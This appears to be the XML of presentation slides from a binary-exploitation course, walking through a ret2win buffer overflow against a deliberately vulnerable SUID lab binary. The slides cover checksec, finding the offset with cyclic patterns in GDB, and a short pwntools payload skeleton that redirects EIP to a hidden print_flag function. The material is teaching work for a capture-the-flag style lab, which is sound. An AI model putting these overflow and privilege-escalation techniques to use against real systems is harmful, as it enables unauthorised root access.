            <a:ext cx="200025" cy="2000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628650" y="2890819"/>
            <a:ext cx="3843338" cy="372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Compare the output for RELRO, Stack Canary, NX, and PIE across both targets.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42900" y="3406508"/>
            <a:ext cx="200025" cy="200025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22" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="3406508"/>
            <a:ext cx="200025" cy="2000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28650" y="3535096"/>
            <a:ext cx="3843338" cy="372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Overflow each binary with oversized input and observe the differing crash behaviors.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42900" y="4050785"/>
            <a:ext cx="4129088" cy="2899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50" i="1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Note: Security flags vary per binary. Always inspect the live output rather than relying on assumptions.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4672013" y="2828813"/>
            <a:ext cx="4129088" cy="417909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6" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4729163" y="2885963"/>
            <a:ext cx="4014788" cy="3036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"checksec first. Always."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3946922" y="4882753"/>
            <a:ext cx="125015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8558213" y="4732734"/>
            <a:ext cx="242888" cy="33932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14</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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900" y="732067"/>
            <a:ext cx="8458200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Someone else can open the door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342900" y="1550026"/>
            <a:ext cx="939403" cy="16430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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1550026"/>
            <a:ext cx="939403" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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PRIVILEGE ESCALATION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342900" y="1957220"/>
            <a:ext cx="4903459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Understanding SUID Binaries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2900" y="2342983"/>
            <a:ext cx="4903459" cy="6171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challenge binary </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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intro2pwn3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 configured with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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SUID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(Set Owner User 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ID), meaning it executes with the privileges of its owner (root) rather than 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unprivileged user running it.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42900" y="3088723"/>
            <a:ext cx="4903459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Inside the binary, a hidden function named </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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print_flag()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exists but is never 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called during normal execution. Our goal is to force the program to run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32109" y="2194806"/>
            <a:ext cx="3268991" cy="16859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Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532109" y="2194806"/>
            <a:ext cx="3268991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3" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8793956" y="2194806"/>
            <a:ext cx="7144" cy="168592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4" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532109" y="3873587"/>
            <a:ext cx="3268991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5" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5532109" y="2194806"/>
            <a:ext cx="85725" cy="1685925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16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5746421" y="2519846"/>
            <a:ext cx="471488" cy="16430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17" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5746421" y="2519846"/>
            <a:ext cx="471488" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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ANALOGY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5746421" y="2755590"/>
            <a:ext cx="2840366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Librarian Key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746421" y="3059199"/>
            <a:ext cx="2840366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Think of SUID like borrowing a librarian's master key: the program has special permissions that allow it to read files ordinary users cannot access.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946922" y="4868466"/>
            <a:ext cx="125015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8565356" y="4718447"/>
            <a:ext cx="235744" cy="33932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15</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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900" y="732067"/>
            <a:ext cx="8458200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Redirect EIP to the hidden function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342900" y="1550026"/>
            <a:ext cx="796528" cy="16430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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="342900" y="1550026"/>
            <a:ext cx="796528" cy="164306"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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EXPLOIT STRATEGY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342900" y="1957220"/>
            <a:ext cx="4086225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Hijacking Control Flow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2900" y="2342983"/>
            <a:ext cx="4086225" cy="6171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goal is to exploit the buffer overflow vulnerability in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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intro2pwn3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to overwrite the saved return address (EIP) with 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memory address of the hidden </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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print_flag()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function.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42900" y="3088723"/>
            <a:ext cx="4086225" cy="6171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the vulnerable function completes, the CPU reads the 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modified EIP and jumps straight into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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print_flag()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printing the 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flag on our screen.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14875" y="1982279"/>
            <a:ext cx="4086225" cy="2110978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2" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4929188" y="2196592"/>
            <a:ext cx="3657600" cy="1535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RET2WIN Payload Structure ]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929188" y="2493057"/>
            <a:ext cx="3657600" cy="621506"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Padding Buffer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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60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(Exact offset to reach EIP)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929188" y="3186001"/>
            <a:ext cx="3657600" cy="621506"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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29188" y="3186001"/>
            <a:ext cx="3657600" cy="621506"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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Address of print_flag()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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6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(4 bytes / Little-Endian)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946922" y="4868466"/>
            <a:ext cx="125015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8572500" y="4718447"/>
            <a:ext cx="228600" cy="33932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16</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="30670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1" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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8625" y="571500"/>
            <a:ext cx="8286750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Finding the offset with cyclic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428625" y="1457325"/>
            <a:ext cx="4000500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4-byte chunk in a cyclic pattern is unique.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28625" y="1835944"/>
            <a:ext cx="40005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the program crashes, the value in EIP reveals which chunk caused the overflow.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28625" y="2414588"/>
            <a:ext cx="1114425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cyclic_find()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28625" y="2229564"/>
            <a:ext cx="3839766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computes the distance from the start to that chunk.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14875" y="1457325"/>
            <a:ext cx="4000500" cy="214312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1" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4857750" y="1600200"/>
            <a:ext cx="3714750" cy="1464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FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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cyclic 100 &gt; pattern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57750" y="1746647"/>
            <a:ext cx="3714750" cy="1464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FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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gdb ./intro2pwn3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857750" y="1893094"/>
            <a:ext cx="3714750" cy="1464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FF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gdb-pwn&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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run &lt; pattern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857750" y="2039541"/>
            <a:ext cx="3714750" cy="1464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EIP shows 'jaaa'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857750" y="2185988"/>
            <a:ext cx="3714750" cy="1464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FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="9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cyclic_find('jaaa')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857750" y="2332434"/>
            <a:ext cx="3714750" cy="1464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Result: &lt;offset_value&gt;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28625" y="4850606"/>
            <a:ext cx="8286750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8479631" y="4614863"/>
            <a:ext cx="235744" cy="3857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17</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="39" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="623888" y="339685"/>
            <a:ext cx="958850" cy="1225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0C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Invstigations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Shape 0"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="310515" y="306705"/>
            <a:ext cx="304165" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5C518"/>
          </a:solidFill>
        </p:spPr>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="483870" y="350520"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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Verify with a dummy address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428625" y="1460897"/>
            <a:ext cx="775097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Padding =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203722" y="1457325"/>
            <a:ext cx="1200150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cyclic(offset)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403872" y="1460897"/>
            <a:ext cx="914400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reach the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28625" y="1660922"/>
            <a:ext cx="1085850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return address.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28625" y="2043113"/>
            <a:ext cx="371475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EIP =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0100" y="2039541"/>
            <a:ext cx="1285875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p32(0xdeadbeef)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085975" y="2043113"/>
            <a:ext cx="1032272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overwrite it.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28625" y="2425303"/>
            <a:ext cx="1703784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the crash shows EIP =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132409" y="2421731"/>
            <a:ext cx="857250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0xdeadbeef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989659" y="2425303"/>
            <a:ext cx="389334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your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28625" y="2625328"/>
            <a:ext cx="1132284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offset is perfect.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914775" y="1457325"/>
            <a:ext cx="4800600" cy="250031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Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3914775" y="1457325"/>
            <a:ext cx="4800600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9" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8708231" y="1457325"/>
            <a:ext cx="7144" cy="250031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0" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3914775" y="3950494"/>
            <a:ext cx="4800600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1" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3914775" y="1457325"/>
            <a:ext cx="107156" cy="2500313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2" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4129088" y="1671638"/>
            <a:ext cx="4371975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PWNTOOLS SKELETON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129088" y="2071688"/>
            <a:ext cx="4371975" cy="12858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pwn import *
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333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padding = cyclic(cyclic_find('jaaa'))
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333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eip = p32(0xdeadbeef)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333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3333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payload = padding + eip
</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3333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 payload
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28625" y="4850606"/>
            <a:ext cx="8286750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8451056" y="4614863"/>
            <a:ext cx="264319" cy="3857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18</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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Where does print_flag live?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428625" y="1457325"/>
            <a:ext cx="4000500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GDB to find where the function lives in memory.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28625" y="1835944"/>
            <a:ext cx="3418284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address will be used to replace our dummy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28625" y="2035969"/>
            <a:ext cx="857250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0xdeadbeef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285875" y="2039541"/>
            <a:ext cx="32147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28625" y="2418159"/>
            <a:ext cx="40005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Once replaced, the program will jump to this function upon return.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28625" y="3103959"/>
            <a:ext cx="40005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Action: Swap the dummy address in your script with this real address.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14875" y="1457325"/>
            <a:ext cx="4000500" cy="2225278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57750" y="1600200"/>
            <a:ext cx="3714750" cy="1321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FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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gdb ./intro2pwn3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857750" y="1732359"/>
            <a:ext cx="3714750" cy="1321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FF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gdb-pwn&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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print &amp;print_flag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857750" y="1935956"/>
            <a:ext cx="3714750" cy="1321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$1 = (void (*)()) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F2C2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0x08048536</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="8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&lt;print_flag&gt;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28625" y="4850606"/>
            <a:ext cx="8286750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8461772" y="4614863"/>
            <a:ext cx="253603" cy="3857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19</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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gdb won't use suid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657225" y="1828800"/>
            <a:ext cx="2400300" cy="3036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GDB (DEBUG)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7225" y="2275284"/>
            <a:ext cx="2400300" cy="53996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GDB drops </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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suid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permissions for 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security. You can control EIP, but you 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cannot read the protected flag file.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429000" y="2421731"/>
            <a:ext cx="2286000" cy="142875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9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="2135981"/>
            <a:ext cx="2286000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SWITCH TO REAL SHELL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857875" y="1600200"/>
            <a:ext cx="2857500" cy="1785938"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF9C4"/>
          </a:solidFill>
          <a:ln w="18288">
            <a:solidFill>
              <a:srgbClr val="F2C2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72188" y="1814513"/>
            <a:ext cx="2428875" cy="3036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SHELL (REAL ATTACK)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072188" y="2260997"/>
            <a:ext cx="2428875" cy="7199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Running the exploit directly allows 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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="90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suid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bit to function, giving you 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owner's permissions to read the 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flag.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28625" y="3814763"/>
            <a:ext cx="8286750" cy="335756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4" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3814763"/>
            <a:ext cx="71438" cy="33575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15" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="571500" y="3957638"/>
            <a:ext cx="8001000" cy="1928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FF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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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./intro2pwn3 &lt; attack_payload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28625" y="4850606"/>
            <a:ext cx="8286750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8401050" y="4614863"/>
            <a:ext cx="314325" cy="3857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20</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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Lab 2 — Jump to print_flag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428625" y="1457325"/>
            <a:ext cx="250031" cy="250031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7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1457325"/>
            <a:ext cx="250031" cy="25003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1531" y="1464469"/>
            <a:ext cx="1943100" cy="23931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 the offset using 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764631" y="1464469"/>
            <a:ext cx="617265" cy="2321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cyclic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381896" y="1464469"/>
            <a:ext cx="1332309" cy="23931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pattern in GDB.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8625" y="1857375"/>
            <a:ext cx="250031" cy="250031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2" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="1857375"/>
            <a:ext cx="250031" cy="25003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1531" y="1864519"/>
            <a:ext cx="3128963" cy="23931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Verify control by overwriting EIP with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950494" y="1864519"/>
            <a:ext cx="1028756" cy="2321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0xdeadbeef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79250" y="1864519"/>
            <a:ext cx="35719" cy="2393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28625" y="2257425"/>
            <a:ext cx="250031" cy="250031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7" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2257425"/>
            <a:ext cx="250031" cy="25003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1531" y="2264569"/>
            <a:ext cx="678656" cy="2393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 the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500188" y="2264569"/>
            <a:ext cx="1028756" cy="2321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print_flag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2528943" y="2264569"/>
            <a:ext cx="1307306" cy="23931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address using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836250" y="2264569"/>
            <a:ext cx="1748823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print &amp;print_flag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585073" y="2264569"/>
            <a:ext cx="642938" cy="2393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GDB.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28625" y="2657475"/>
            <a:ext cx="250031" cy="250031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4" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="2657475"/>
            <a:ext cx="250031" cy="25003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21531" y="2664619"/>
            <a:ext cx="1996678" cy="23931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the final payload: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2818209" y="2664619"/>
            <a:ext cx="2263173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padding + p32(address)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081383" y="2664619"/>
            <a:ext cx="35719" cy="2393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28625" y="3057525"/>
            <a:ext cx="250031" cy="250031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9" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="428625" y="3057525"/>
            <a:ext cx="250031" cy="25003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21531" y="3064669"/>
            <a:ext cx="1835944" cy="23931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Execute outside GDB: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2657475" y="3064669"/>
            <a:ext cx="2263173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./intro2pwn3 &lt; payload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4920648" y="3064669"/>
            <a:ext cx="1685925" cy="23931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capture the flag.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0" y="3839766"/>
            <a:ext cx="9144000" cy="589359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34" name="Text 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="3982641"/>
            <a:ext cx="9144000" cy="3036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"You didn't guess the password. You changed the destination."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428625" y="4850606"/>
            <a:ext cx="8286750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8472488" y="4614863"/>
            <a:ext cx="242888" cy="3857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21</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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Sometimes you flip a variable, not EIP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428625" y="1457325"/>
            <a:ext cx="4714875" cy="2357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every exploit needs to hijack the instruction pointer (EIP).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28625" y="1907381"/>
            <a:ext cx="4714875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Variables stored next to each other in memory can be overwritten by a buffer overflow.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28625" y="2593181"/>
            <a:ext cx="4714875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a critical variable (like a flag check) is adjacent to a buffer, we can change the program's logic directly.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36569" y="1764506"/>
            <a:ext cx="614363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buff[32]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86475" y="2007394"/>
            <a:ext cx="2114550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(User Input Buffer)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072188" y="2157413"/>
            <a:ext cx="2143125" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2C2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15125" y="2307431"/>
            <a:ext cx="857250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int printflag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72188" y="2550319"/>
            <a:ext cx="2143125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(Target Variable)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072188" y="2714625"/>
            <a:ext cx="2143125" cy="428625"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill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8888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Other Stack Data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28625" y="4850606"/>
            <a:ext cx="8286750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8422481" y="4614863"/>
            <a:ext cx="292894" cy="3857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22</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="41" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="0">
            <a:off x="232410" y="190500"/>
            <a:ext cx="102870" cy="95250"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="812800" cy="812800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="42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75" y="142875"/>
            <a:ext cx="1510903" cy="22145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4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="392906" y="178594"/>
            <a:ext cx="115371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Hidden Investigations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28625" y="571500"/>
            <a:ext cx="8286750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Neighbours in memory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428625" y="1600200"/>
            <a:ext cx="377223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buff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05848" y="1603772"/>
            <a:ext cx="2828925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(32 bytes) is the target for our input.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28625" y="1966652"/>
            <a:ext cx="848711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printflag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277336" y="1970224"/>
            <a:ext cx="2507456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(4 bytes) is the control variable.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28625" y="2336676"/>
            <a:ext cx="3975497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32 bytes of 'A' fill the buffer; the next 4 bytes land in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404122" y="2333104"/>
            <a:ext cx="848711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printflag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252833" y="2336676"/>
            <a:ext cx="32147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500188" y="2985306"/>
            <a:ext cx="4286250" cy="921544"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0000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00188" y="2985306"/>
            <a:ext cx="4286250" cy="921544"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="34023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buff [ 32 bytes ]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857875" y="2985306"/>
            <a:ext cx="1785938" cy="921544"/>
          </a:xfrm>
